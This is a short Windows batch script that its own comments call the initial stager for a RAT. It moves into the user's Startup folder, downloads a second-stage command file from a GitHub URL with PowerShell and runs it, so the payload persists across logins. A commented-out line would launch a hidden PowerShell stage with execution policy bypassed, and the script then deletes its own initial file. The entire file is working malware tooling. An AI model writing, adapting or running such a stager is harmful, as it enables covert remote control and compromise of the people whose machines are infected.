@echo off
@REM intail stager for RAT
@REM Created by : NINJACAT811

set INTIAL_PATH=%cd%


@REM move into startup directory


set NEXT_PATH=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup
echo %NEXT_PATH%


cd %NEXT_PATH%

@REM write payloads to startup

powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Zeyadm8112/RattMurdock/blob/main/wget.cmd' -OutFile 'wget.cmd'"

@REM run p

@REM powershell.exe -Command "Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""stage_two.cmd""'"

@REM start wget1.cmd
start wget.cmd
@REM delete the intial file

cd %INTIAL_PATH%
echo %INTIAL_PATH%
del initial.cmd

